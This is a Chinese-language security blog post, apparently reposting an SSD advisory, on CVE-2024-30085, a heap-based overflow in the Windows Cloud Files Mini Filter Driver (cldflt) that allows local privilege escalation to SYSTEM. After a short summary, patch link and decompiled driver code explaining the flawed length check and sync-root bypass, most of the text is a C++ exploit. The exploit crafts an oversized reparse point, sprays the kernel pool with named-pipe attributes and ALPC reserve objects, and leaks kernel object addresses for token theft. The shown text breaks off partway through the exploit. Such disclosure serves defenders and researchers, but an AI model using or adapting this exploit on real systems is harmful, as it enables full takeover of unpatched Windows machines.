#  新的Windows权限提升漏洞！ SSD 咨询 – cldflt 基于堆的溢出 (PE)   
 Ots安全   2024-12-21 07:35  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
**概括**  
  
漏洞允许本地攻击者提升受影响的 Microsoft Windows 安装的权限。要利用此漏洞，攻击者必须首先获得在目标系统上执行低权限代码的能力。  
  
该特定缺陷存在于 Cloud Files Mini Filter Driver 中。该问题源于在将用户提供的数据复制到固定长度的基于堆的缓冲区之前对数据长度的验证不当。攻击者可以利用此漏洞提升权限并在 SYSTEM 上下文中执行代码。  
  
该漏洞在 TyphoonPWN 2024 活动期间成功演示并获得第三名。  
  
**信用**  
  
独立安全研究员 Alex Birnberg 参加 TyphoonPWN 2024 并获得第三名。  
  
**供应商回应**  
  
微软已发布针对此漏洞的补丁：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30085  
  
**受影响的版本**  
  
Windows 11 23H2  
  
**CVE**  
  
CVE-2024-30085  
  
**技术分析**  
  
漏洞的根本原因可能位于微过滤驱动程序  
HsmIBitmapNORMALOpen中的函数中  
cldflt。解析重解析点位图 [ 1 ] 时，该函数首先检查 [ 2 ] 位图的大小是否大于  
0xfff，如果是，则复制 [ 3 ] 并将其复制到一个常量大小的堆分配缓冲区中。  
  
```
int HsmIBitmapNORMALOpen
              (FLT_INSTANCE_CONTEXT *instanceContext,void *param_2,longlong param_3,
              undefined4 param_4,CLD_REPARSE_DATA_BUFFER_1 *buffer,UINT length,undefined8 *param_7)

{ 
  local_70 = (void *)0x0;
  // ...
    if (buffer->numItems < 5) {
LAB_1c006ce47:
      iVar16 = -0x3ffffddb;
    }
    else {
      uVar3 = buffer->size;
      pFVar17 = (FLT_INSTANCE_CONTEXT *)(ulonglong)uVar3;
      if ((((uVar3 < 0x38) || (uVar1 = buffer->items[4].tag, 0x11 < uVar1)) ||
          ((uVar4 = buffer->items[4].offset, uVar4 != 0 &&
           ((uVar4 < (uint)buffer->numItems * 8 + 0x10 || (uVar3 < uVar4)))))) ||
         ((uVar2 = buffer->items[4].size, uVar3 < uVar2 ||
          (((uVar7 = uVar2 + uVar4, uVar7 < uVar4 || (uVar3 < uVar7)) || (uVar1 != 0x11))))))
      goto LAB_1c006ce47;
      uVar19 = buffer->items[4].offset;
      if ((uVar19 == 0) || (buffer->items[4].size == 0)) {
        local_70 = (void *)0x0;
      }
      else {
        local_70 = (void *)((longlong)&((CLD_REPARSE_DATA_BUFFER_1 *)(buffer->items + -2))->magic +
                           (ulonglong)uVar19); // 1
      }
      uVar19 = (uint)buffer->items[4].size;
    }
    if (iVar16 < 0) {
      uVar19 = 0;
    }
  }
  // ...
  if ((local_70 == (void *)0x0) || (0xffe < uVar19 - 1)) { // 2
    uVar18 = 0x6d427348;
    *(undefined8 *)(puVar15 + -8) = 0x1c006d123;
    pvVar11 = (void *)ExAllocatePool2(0x100,0x1000,0x6d427348);
    bitmap->field8_0x38 = pvVar11;
    if (pvVar11 != (void *)0x0) {
      *(undefined8 *)(puVar15 + -8) = 0x1c006d1a3;
      memmove(pvVar11,local_70,(ulonglong)uVar19); // 3
      goto LAB_1c006d1a3;
  // ...}
```  
  
  
代码尝试检查 [ 6 ] 位图的长度是否不超过常量缓冲区的大小，但是在检查长度之前，会从重新解析点获取一个变量 [4]，如果已设置为该变量，则  
false跳过长度检查。  
  
```
int HsmpBitmapIsReparseBufferSupported(CLD_REPARSE_DATA_BUFFER_1 *buffer,uint length)
{
  // ...
                    /* check item 2, tag = 0x7, size = 0x1 */
              if (((((uVar3 < 0x18) || (buffer->numItems < 3)) || (uVar3 < 0x28)) ||
                  (uVar1 = buffer->items[2].tag, 0x11 < uVar1)) ||
                 ((((uVar6 = buffer->items[2].offset, uVar6 != 0 &&
                    ((uVar6 < (uint)buffer->numItems * 8 + 0x10 || (uVar3 < uVar6)))) ||
                   (uVar2 = buffer->items[2].size, uVar3 < uVar2)) ||
                  (((uVar7 = uVar2 + uVar6, uVar7 < uVar6 || (uVar3 < uVar7)) ||
                   ((uVar1 != 7 || (buffer->items[2].size != 1)))))))) {
                status = -0x3ffffddb;
              }
              else {
                memmove(&local_res8,
                        (void *)((longlong)
                                 &((CLD_REPARSE_DATA_BUFFER_1 *)(buffer->items + -2))->magic +
                                (ulonglong)buffer->items[2].offset),1);
                hasBuf = (bool)local_res8; // 4
              }
              // ...
              if (hasBuf != false) { // 5
                if (buffer->numItems < 4) {
                  // ...
                }
                if (buffer->items[4].offset == 0) {
                  // ...
                }
                if (0x1000 < buffer->items[4].size) { // 6
                  HsmDbgBreakOnCorruption();
                  HsmDbgBreakOnStatus(-0x3fff30fe);
                  if ((undefined **)WPP_GLOBAL_Control == &WPP_GLOBAL_Control) {
                    return -0x3fff30fe;
                  }
                  if ((*(uint *)(WPP_GLOBAL_Control + 0x2c) & 1) == 0) {
                    return -0x3fff30fe;
                  }
                  if ((byte)WPP_GLOBAL_Control[0x29] < 2) {
                    return -0x3fff30fe;
                  }
                  WPP_SF_ddd(*(undefined8 *)(WPP_GLOBAL_Control + 0x18),0xa2,
                             &WPP_ebfc5217bc2638101cf379f140ac8387_Traceguids,
                             (uint)buffer->items[4].size,0,2);
                  return -0x3fff30fe;
                }
              }
    // ...
}
```  
  
  
  
默认情况下，不允许在注册并连接同步根后在其内设置重解析点。代码调用 [ 7 ]HsmiCldGetSyncProviderProcess  
   
函数来确保情况确实如此，方法是检查每个文件是否不属于任何同步根。  
  
```
uint HsmFltPreFILE_SYSTEM_CONTROL
               (FLT_CALLBACK_DATA *data,FLT_RELATED_OBJECTS *fltObjects,PVOID *completionContext)

{
  // ...
      if (uVar1 == FSCTL_SET_REPARSE_POINT) {
        reparseUpdate = (FLT_REPARSE_UPDATE *)0x0;
        local_50 = (FLT_INSTANCE_CONTEXT *)0x0;
        providerProcess = (PEPROCESS)0x0;
        if (3 < *(uint *)&(pFVar17->parameters).Argument2) {
                    /* WARNING: Load size is inaccurate */
          if ((streamContext == (FLT_STREAM_CONTEXT *)0x0) ||
             ((*(uint *)((longlong)&(streamContext->reparseUpdate->lock).field0_0x0 + 4) & 1) == 0))
          {
            if ((*(pFVar17->parameters).Argument4 & 0xffff0fff) != g_reparseTagCloud)
            goto LAB_1c007ebb9;
            if (streamContext != (FLT_STREAM_CONTEXT *)0x0) goto LAB_1c007ea86;
          }
          else {
LAB_1c007ea86:
            reparseUpdate = streamContext->reparseUpdate;
            local_50 = (FLT_INSTANCE_CONTEXT *)reparseUpdate->field2_0x10->instance;
          }
          instance = (FLT_INSTANCE_CONTEXT *)0x0;
          FltGetInstanceContext(pFVar17->targetInstance,&instance);
          if (instance != (FLT_INSTANCE_CONTEXT *)0x0) {
            if (instance->magic != 0x63497348) {
              FltReleaseContext(instance);
              instance = (FLT_INSTANCE_CONTEXT *)0x0;
            }
            context = instance;
            if (instance != (FLT_INSTANCE_CONTEXT *)0x0) {
              iVar8 = HsmiCldGetSyncProviderProcess
                                (instance,reparseUpdate,data->iopb->targetFileObject, // 7
                                 (PEPROCESS *)&providerProcess);
              HsmDbgBreakOnStatus(iVar8);
              if (-1 < (int)iVar8) {
                if (providerProcess == (PEPROCESS)0x0) goto LAB_1c007ebad;
                iVar8 = 0xc000cf18;
                HsmDbgBreakOnStatus(-0x3fff30e8);
              }
              if ((((undefined **)WPP_GLOBAL_Control != &WPP_GLOBAL_Control) &&
                  ((*(uint *)(WPP_GLOBAL_Control + 0x2c) & 1) != 0)) &&
                 (1 < (byte)WPP_GLOBAL_Control[0x29])) {
                uVar14 = 0x13;
LAB_1c007eb5e:
                WPP_SF_iiqd(*(undefined8 *)(WPP_GLOBAL_Control + 0x18),uVar14,
                            &WPP_342c4cc461be373729abc9b16bce3879_Traceguids,streamContext,
                            (char)reparseUpdate,(char)local_50,(char)iVar8);
              }
LAB_1c007eb89:
              FltReleaseContext(context);
              if ((int)iVar8 < 0) {
                (data->ioStatus).field0_0x0.Status = iVar8;
                uVar10 = 4;
                (data->ioStatus).Information = 0;
              }
            }
          }
        }
        goto LAB_1c007ebb9;
      }
  // ...
}
```  
  
  
  
该  
HsmiCldGetSyncProviderProcess函数从文件对象中获取 [ 8 ] 文件名，并使用它来获取 [ 9 ] 与该文件关联的同步根条目。但是，该检查存在缺陷，因为文件名字段仅在 期间有效IRP_MJ_CREATE  
.。可以移动文件所在的目录，然后将其设为重解析点，从而绕过检查，因为没有具有新路径的同步根。  
  
```
int HsmiCldGetSyncProviderProcess
              (FLT_INSTANCE_CONTEXT *instanceContext,FLT_REPARSE_UPDATE *reparseUpdate,
              PFILE_OBJECT fileObject,PEPROCESS *providerProcess)

{
  // ...
  if (fileObject != (PFILE_OBJECT)0x0) {
    status = HsmiQueryFullFilePath
                       (instanceContext->instance,reparseUpdate_0,fileObject,0x101, // 8
                        (PUNICODE_STRING)&filePath);
    // ...
      lVar1 = (PEPROCESS)
              (*CldHsmGetSyncProviderProcessByPath)
                        (*(undefined8 *)&instanceContext->field_0x10,&filePath); // 9
  }
  // ...
  return status;
}
```  
  
  
**EXP**  
  
```
// main.cpp
#include <Windows.h>
#include <cfapi.h>
#include <tchar.h>
#include <stdio.h>
#include <winternl.h>

#include "main.h"

#pragma comment(lib, "cldapi.lib")
#pragma comment(lib, "ntdll.lib")

typedef struct _ALPC_MESSAGE_ATTRIBUTES {
  ULONG AllocatedAttributes;
  ULONG ValidAttributes;
}
ALPC_MESSAGE_ATTRIBUTES, * PALPC_MESSAGE_ATTRIBUTES;

typedef struct _ALPC_MESSAGE {
  PORT_MESSAGE PortHeader;
  BYTE PortMessage[1000];
}
ALPC_MESSAGE, * PALPC_MESSAGE;

/*typedef struct _CLIENT_ID {    HANDLE UniqueProcess;    HANDLE UniqueThread;} CLIENT_ID;*/

/*typedef enum _SYSTEM_INFORMATION_CLASS {    SystemHandleInformation = 16,    SystemBigPoolInformation = 66} SYSTEM_INFORMATION_CLASS;*/

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
}
RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
}
RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
  unsigned short UniqueProcessId;
  unsigned short CreatorBackTraceIndex;
  unsigned char ObjectTypeIndex;
  unsigned char HandleAttributes;
  unsigned short HandleValue;
  void * Object;
  unsigned long GrantedAccess;
  long __PADDING__[1];
}
SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
  unsigned long NumberOfHandles;
  struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
}
SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef struct _SYSTEM_BIGPOOL_ENTRY {
  union {
    PVOID VirtualAddress;
    ULONG_PTR NonPaged: 1;
  };
  SIZE_T SizeInBytes;
  union {
    UCHAR Tag[4];
    ULONG TagUlong;
  };
}
SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
  ULONG Count;
  SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
}
SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;

typedef NTSTATUS(NTAPI * NTFSCONTROLFILE)(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PVOID ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN ULONG FsControlCode,
  IN PVOID InputBuffer OPTIONAL,
  IN ULONG InputBufferLength,
  OUT PVOID OutputBuffer OPTIONAL,
  IN ULONG OutputBufferLength
);

extern "C"
NTSTATUS NTAPI NtAlpcCreatePort(
  _Out_ PHANDLE PortHandle,
  _In_ POBJECT_ATTRIBUTES ObjectAttributes,
  _In_opt_ PALPC_PORT_ATTRIBUTES PortAttributes
);

extern "C"
NTSTATUS NTAPI NtAlpcCreateResourceReserve(
  _In_ HANDLE PortHandle,
  _Reserved_ ULONG Flags,
  _In_ SIZE_T MessageSize,
  _Out_ PHANDLE ResourceId
);

extern "C"
NTSTATUS NTAPI NtAlpcSendWaitReceivePort(
  _In_ HANDLE PortHandle,
  _In_ ULONG Flags,
  _Inout_opt_ PPORT_MESSAGE SendMessage,
  _Inout_opt_ PALPC_MESSAGE_ATTRIBUTES SendMessageAttributes,
  _Inout_opt_ PPORT_MESSAGE ReceiveMessage,
  _Inout_opt_ PSIZE_T BufferLength,
  _Inout_opt_ PALPC_MESSAGE_ATTRIBUTES ReceiveMessageAttributes,
  _In_opt_ PLARGE_INTEGER Timeout
);

NTFSCONTROLFILE NtFsControlFile;

PREPARSE_DATA_BUFFER MakeDataBuffer(PVOID overData, ULONG overSize) {
  DWORD dataLen = 0x3fe8;
  PBYTE data = new BYTE[dataLen];

  memset(data, 0, dataLen);
  *(PUSHORT) & data[0x0] = 0x0001;
  *(PUSHORT) & data[0x2] = 0x4000;

  PREPARSE_CLD_BUFFER cld = (PREPARSE_CLD_BUFFER) & data[4];
  PBYTE p = (PBYTE) & cld -> Magic;
  cld -> Magic = REPARSE_BUFFER_MAGIC_VALUE;
  cld -> Reserved = 0x0000;
  cld -> NumItems = 0;
  cld -> Size = 0x3fe4;

  CLD_ADD_ITEM(0x7, 1, 0x200); // must be {0, 1}
  CLD_ADD_ITEM(0xa, 4, 0x204); // some kind of flag
  CLD_ADD_ITEM(0x6, 8, 0x208); // ???
  CLD_ADD_ITEM(0, 0, 0); // dummy
  CLD_ADD_ITEM(0x11, 0x3800, 0x210); // bitmap

  *(PBYTE) & p[0x200] = 0x01;
  *(PULONG32) & p[0x204] = 0x00000000;
  *(PULONG64) & p[0x208] = 0x0000000000000000;

  cld = (PREPARSE_CLD_BUFFER) & p[0x210];
  p = (PBYTE) & cld -> Magic;
  cld -> Magic = REPARSE_BITMAP_MAGIC_VALUE;
  cld -> Reserved = 0x0000;
  cld -> NumItems = 0;
  cld -> Size = 0x3800;

  CLD_ADD_ITEM(0x7, 1, 0x100);
  CLD_ADD_ITEM(0x7, 1, 0x101);
  CLD_ADD_ITEM(0x7, 1, 0x102);
  CLD_ADD_ITEM(0x6, 8, 0x104);
  CLD_ADD_ITEM(0x11, 0x1000 + overSize, 0x110);

  *(PBYTE) & p[0x100] = 0x00;
  *(PBYTE) & p[0x101] = 0x01;
  *(PBYTE) & p[0x102] = 0x00;

  memcpy( & p[0x1110], overData, overSize);

  PBYTE reparseBuffer = new BYTE[sizeof(REPARSE_DATA_BUFFER) + dataLen];
  PREPARSE_DATA_BUFFER rd = (PREPARSE_DATA_BUFFER) reparseBuffer;

  ZeroMemory(reparseBuffer, sizeof(REPARSE_DATA_BUFFER) + dataLen);

  rd -> ReparseTag = IO_REPARSE_TAG_CLOUD;
  rd -> ReparseDataLength = dataLen;
  memcpy(rd -> GenericReparseBuffer.DataBuffer, data, dataLen);

  return rd;
}

BOOL GetObjAddr(PVOID * ppObjAddr, ULONG ulPid, HANDLE handle) {
  PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
  ULONG ulBytes = 0;
  NTSTATUS ntRet;

  * ppObjAddr = NULL;

  while ((ntRet = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) 16, pHandleInfo, ulBytes, & ulBytes)) == STATUS_INFO_LENGTH_MISMATCH) {
    if (pHandleInfo != NULL) {
      pHandleInfo = (PSYSTEM_HANDLE_INFORMATION) realloc(pHandleInfo, 2 * ulBytes);
    } else {
      pHandleInfo = (PSYSTEM_HANDLE_INFORMATION) calloc(1, 2 * ulBytes);
    }
  }

  if (!NT_SUCCESS(ntRet)) {
    goto Exit;
  }

  for (ULONG i = 0; i < pHandleInfo -> NumberOfHandles; i++) {
    if ((pHandleInfo -> Handles[i].UniqueProcessId == ulPid) && (pHandleInfo -> Handles[i].HandleValue == (USHORT) handle)) {
      * ppObjAddr = pHandleInfo -> Handles[i].Object;
      break;
    }
  }

  Exit:
    if (pHandleInfo)
      free(pHandleInfo);

  return ( * ppObjAddr != NULL);
}

BOOL GetPoolAddr(PVOID * ppPoolAddr, UINT tag, SIZE_T poolSize) {
  NTSTATUS ntRet;
  BOOL bRet = FALSE;
  ULONG retlen;

  * ppPoolAddr = NULL;
  DWORD * info = (DWORD * ) malloc(0x1000);
  PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo;
  ntRet = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) 66, info, 0x1000, & retlen);
  if ((ntRet != STATUS_INFO_LENGTH_MISMATCH) && !NT_SUCCESS(ntRet)) {
    goto Exit;
  }

  info = (DWORD * ) realloc(info, retlen);
  ntRet = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) 66, info, retlen, & retlen);
  if (!NT_SUCCESS(ntRet)) {
    goto Exit;
  }

  pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION) info;
  if (pBigPoolInfo -> Count == 0) {
    goto Exit;
  }
  for (ULONG i = pBigPoolInfo -> Count - 1; i >= 0; i--) {
    if ((pBigPoolInfo -> AllocatedInfo[i].TagUlong == tag) && (pBigPoolInfo -> AllocatedInfo[i].SizeInBytes == poolSize)) {
      * ppPoolAddr = pBigPoolInfo -> AllocatedInfo[i].VirtualAddress;
      bRet = TRUE;
      break;
    }
  }

  Exit:
    free(info);
  return bRet;
}

HANDLE g_readPipe;
HANDLE g_writePipe;

BOOL PipeInit() {
  return CreatePipe( & g_readPipe, & g_writePipe, NULL, 0);
}

BOOL PipeWriteAttr(VOID * attr, UINT attrSize) {
  IO_STATUS_BLOCK iosb;
  char output[0x100];
  NTSTATUS ntRet = NtFsControlFile(g_writePipe, NULL, NULL, NULL, &
    iosb, 0x11003C, attr, attrSize,
    output, sizeof(output));
  return NT_SUCCESS(ntRet);
}

BOOL PipeReadAttr(CHAR * pipeName, PVOID pOutput, SIZE_T outputSize) {
  IO_STATUS_BLOCK iosb;
  NTSTATUS ntRet = NtFsControlFile(g_writePipe, NULL, NULL, NULL, & iosb, 0x110038, pipeName, strlen(pipeName) + 1, pOutput, outputSize);
  return NT_SUCCESS(ntRet);
}

BOOL PipePoolSprayAlloc(SIZE_T poolSize, UINT sprayCount, BYTE * pAttr, PCSTR szPrefix) {
  BOOL bRet = TRUE;
  SIZE_T attrSize = poolSize - 0x28;

  for (UINT i = 0; i < sprayCount; i++) {
    snprintf((CHAR * ) pAttr, attrSize, "%s%x", szPrefix, i);
    if (!PipeWriteAttr(pAttr, attrSize)) {
      bRet = FALSE;
      break;
    }
  }

  return bRet;
}

HANDLE g_hResource = NULL;

BOOL AllocateALPCReserveHandles(HANDLE * phPorts, UINT portsCount, UINT reservesCount) {
  HANDLE hPort;
  HANDLE hResource;
  NTSTATUS ntRet;

  for (UINT i = 0; i < portsCount; i++) {
    hPort = phPorts[i];
    for (UINT j = 0; j < reservesCount; j++) {
      ntRet = NtAlpcCreateResourceReserve(hPort, 0, 0x28, & hResource);
      if (!NT_SUCCESS(ntRet))
        return FALSE;
      if (g_hResource == NULL) { // save only the very first
        g_hResource = hResource;
      }

    }
  }

  return TRUE;
}

BOOL isKernAddr(ULONG_PTR kaddr) {
  return ((kaddr & 0xffff800000000000) == 0xffff800000000000);
}

BOOL CreateALPCPorts() {
  ALPC_PORT_ATTRIBUTES portAttr;
  OBJECT_ATTRIBUTES oa;
  NTSTATUS status;
  UNICODE_STRING objName;
  WCHAR portName[100];

  for (UINT i = 0; i < g_portCount; i++) {
    swprintf_s(portName, 100, L "\\RPC Control\\TestPort_%d", i);
    RtlInitUnicodeString( & objName, portName);
    InitializeObjectAttributes( & oa, & objName, 0, 0, NULL);
    ZeroMemory( & portAttr, sizeof(portAttr));
    portAttr.MaxMessageLength = MAX_MSG_LEN;
    status = NtAlpcCreatePort( & g_ports[i], & oa, & portAttr);
    if (NT_SUCCESS(status) == FALSE) {
      return FALSE;
    }
  }

  return TRUE;
}

BOOL GetTokenOffset(PUINT offset) {
  BOOL result = FALSE;
  PBYTE peb;
  USHORT buildNumber;

  peb = * (PBYTE * )((PBYTE) NtCurrentTeb() + 0x60);
  buildNumber = * (PUINT16) & peb[0x120];

  if (WINDOWS_BUILD_19H1 <= buildNumber && buildNumber <= WINDOWS_BUILD_19H2) {
    * offset = 0x360;
    result = TRUE;
  } else if (buildNumber >= WINDOWS_BUILD_19H2) {
    * offset = 0x4b8;
    result = TRUE;
  }
  return result;
}

BOOL Initialize() {
  BOOL result;

  g_ports = (PHANDLE) HeapAlloc(GetProcessHeap(), 0, g_portCount * sizeof(HANDLE));
  if (g_ports == NULL) {
    return FALSE;
  }

  result = CreatePipe( & g_readPipe, & g_writePipe, NULL, 0);
  if (result == FALSE) {
    return FALSE;
  }

  result = CreateALPCPorts();
  if (result == FALSE) {
    return FALSE;
  }

  CONST ULONG poolAlHaSize = 0x1000;
  CONST ULONG reservesCount = (poolAlHaSize / 2) / sizeof(ULONG_PTR) + 1;

  printf(" allocating alpc reserve handles\n");
  result = AllocateALPCReserveHandles(g_ports, g_portCount, reservesCount - 1);
  if (!result) {
    return FALSE;
  }

  HMODULE ntdll;

  ntdll = LoadLibraryW(L "ntdll.dll");
  if (ntdll == NULL) {
    return FALSE;
  }

  NtFsControlFile = (NTFSCONTROLFILE) GetProcAddress(ntdll, "NtFsControlFile");
  if (NtFsControlFile == NULL) {
    return FALSE;
  }

  PKALPC_BLOB blob;

  blob = (PKALPC_BLOB) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(KALPC_BLOB) + sizeof(KALPC_RESERVE));
  if (blob == NULL) {
    return FALSE;
  }
  blob -> Ref = 1;
  blob -> Type = AlpcReserveType;
  g_reserve = (PKALPC_RESERVE) & blob -> Data;

  blob = (PKALPC_BLOB) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(KALPC_BLOB) + sizeof(KALPC_MESSAGE));
  if (blob == NULL) {
    return FALSE;
  }
  blob -> Ref = 1;
  blob -> Type = AlpcMessageType;
  g_message = (PKALPC_MESSAGE) & blob -> Data;

  g_reserve -> Size = sizeof(KALPC_RESERVE) - sizeof(g_reserve -> Size);
  g_reserve -> Message = g_message;
  g_message -> Reserve = g_reserve;

  return TRUE;
}

int main() {
  BOOL result;
  NTSTATUS status;
  UINT tokenOffset;

  printf("[*] Checking windows version...\n");
  if (GetTokenOffset( & tokenOffset) == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  printf("[*] Initializing...\n");
  if (Initialize() == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  CF_SYNC_REGISTRATION reg = {};
  reg.StructSize = sizeof(reg);
  reg.ProviderName = L "TestProvider";
  reg.ProviderVersion = L "1234";
  reg.ProviderId = {
    0xB196E670,
    0x59C7,
    0x4D41,
    {
      0
    }
  };

  CF_SYNC_POLICIES pol = {};
  pol.StructSize = sizeof(pol);
  pol.HardLink = CF_HARDLINK_POLICY_ALLOWED;
  pol.InSync = CF_INSYNC_POLICY_NONE;
  pol.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
  pol.Population.Primary = CF_POPULATION_POLICY_PARTIAL;

  CF_CONNECTION_KEY key = {};
  CF_CALLBACK_REGISTRATION table[1] = {
    CF_CALLBACK_REGISTRATION_END
  };

  WCHAR targetDir[MAX_PATH + 1] = {};
  WCHAR targetPath[MAX_PATH + 1] = {};
  WCHAR tmpPath[MAX_PATH + 1] = {};

  GetCurrentDirectory(MAX_PATH, targetDir);
  swprintf_s(targetPath, L "%s\\SYNC_ROOT", targetDir);

  CfUnregisterSyncRoot(targetPath);
  RemoveDirectory(targetPath);

  printf(" registering provider\n");
  result = CreateDirectory(targetPath, NULL);
  if (result == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  status = CfRegisterSyncRoot(targetPath, & reg, & pol, CF_REGISTER_FLAG_NONE);
  if (NT_SUCCESS(status) == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  status = CfConnectSyncRoot(targetPath, table, NULL, CF_CONNECT_FLAG_NONE, & key);
  if (NT_SUCCESS(status) == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  printf(" creating reparse point\n");
  swprintf_s(tmpPath, L "%s\\XXX", targetPath);
  result = CreateDirectory(tmpPath, NULL);
  if (result == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  swprintf_s(tmpPath, L "%s\\XXX", targetDir);
  result = MoveFile(targetPath, tmpPath);
  if (result == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  printf(" setting reparse data\n");

  IO_STATUS_BLOCK iosb = {};
  OBJECT_ATTRIBUTES objAttr = {};
  UNICODE_STRING objName = {};
  WCHAR path[MAX_PATH];
  HANDLE file;

  swprintf_s(path, MAX_PATH, L "\\??\\%s%s", targetDir, L "\\XXX\\XXX");

  RtlInitUnicodeString( & objName, path);
  InitializeObjectAttributes( & objAttr, & objName, 0x40, 0, NULL);

  status = NtCreateFile( & file, GENERIC_READ | GENERIC_WRITE, & objAttr, & iosb, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_DIRECTORY_FILE, NULL, 0);
  if (NT_SUCCESS(status) == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  PREPARSE_DATA_BUFFER rd = MakeDataBuffer( & g_reserve, sizeof(g_reserve));
  if (rd == NULL) {
    printf("[-] Error\n");
    return FALSE;
  }

  status = NtFsControlFile(file, NULL, NULL, NULL, & iosb, FSCTL_SET_REPARSE_POINT, rd, rd -> ReparseDataLength + REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, 0);

  CloseHandle(file);

  swprintf_s(tmpPath, L "%s\\XXX", targetDir);
  result = MoveFile(tmpPath, targetPath);
  if (result == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  // Trigger
  ULONG attrSize = 0x1000;
  BYTE * pAttr = (BYTE * ) calloc(attrSize + 10, sizeof(BYTE));
  memset(pAttr, 0, attrSize);

  result = PipePoolSprayAlloc(0x1000, 1, pAttr, "x");
  if (!result) {
    printf("[-] Error\n");
    return FALSE;
  }

  result = PipePoolSprayAlloc(0x1000, SPRAY_COUNT, pAttr, "a");
  if (!result) {
    printf("[-] Error\n");
    return FALSE;
  }

  result = PipePoolSprayAlloc(0x1000, SPRAY_COUNT, pAttr, "b");
  if (!result) {
    printf("[-] Error\n");
    return FALSE;
  }

  UINT holesCount = 0;
  for (int i = 0; i < SPRAY_COUNT; i += 2) {
    snprintf((CHAR * ) pAttr, attrSize, "%s%x", "b", i);
    if (!PipeWriteAttr(pAttr, strlen((CHAR * ) pAttr) + 1)) {
      printf("[-] Error\n");
      return FALSE;
    }
    holesCount++;
  }

  result = AllocateALPCReserveHandles(g_ports, g_portCount, 1);
  if (!result) {
    printf("[-] Error\n");
    return FALSE;
  }

  for (int i = 1; i < SPRAY_COUNT; i += 2) {
    snprintf((CHAR * ) pAttr, attrSize, "%s%x", "b", i);
    if (!PipeWriteAttr(pAttr, strlen((CHAR * ) pAttr) + 1)) {
      printf("[-] Error\n");
      return FALSE;
    }
  }

  swprintf_s(tmpPath, L "%s\\XXX", targetPath);
  file = CreateFile(tmpPath, GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

  printf("[*] Cleaning up...\n");
  status = CfDisconnectSyncRoot(key);
  if (NT_SUCCESS(status) == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  status = CfUnregisterSyncRoot(targetPath);
  if (NT_SUCCESS(status) == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  swprintf_s(tmpPath, L "%s\\XXX", targetPath);
  result = RemoveDirectory(tmpPath);
  if (result == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  result = RemoveDirectory(targetPath);
  if (result == FALSE) {
    printf("[-] Error\n");
    return FALSE;
  }

  printf("[*] Entering interactive session...\n");

  ULONG_PTR ullEPROCaddr = NULL;
  ULONG_PTR ullSystemEPROCaddr = NULL;
  DWORD dwPid = GetCurrentProcessId();

  HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwPid);
  if (hProc == NULL) {
    printf("[-] Error\n");
    return FALSE;
  }

  CONST UINT PIPE_ATTR_TAG = 0x7441704E;
  ULONG_PTR ullPipeAttributeAddr = NULL;
  result = GetPoolAddr((PVOID * ) & ullPipeAttributeAddr, PIPE_ATTR_TAG, 0x1000);
  if (!result) {
    printf("[-] Error\n");
    return FALSE;
  }

  result = GetObjAddr((PVOID * ) & ullSystemEPROCaddr, 4, (HANDLE) 4);
  if (!result) {
    printf("[-] Error\n");
    return FALSE;
  }

  result = GetObjAddr((PVOID * ) & ullEPROCaddr, GetCurrentProcessId(), hProc);
  if (!result) {
    printf("[-] Error\n");
    return FALSE;
  }

  CHAR pipeName[] = "xxx";
  BYTE * outputData = (BYTE * ) calloc(1, 0x1000);
  ULONG_PTR ullToken;
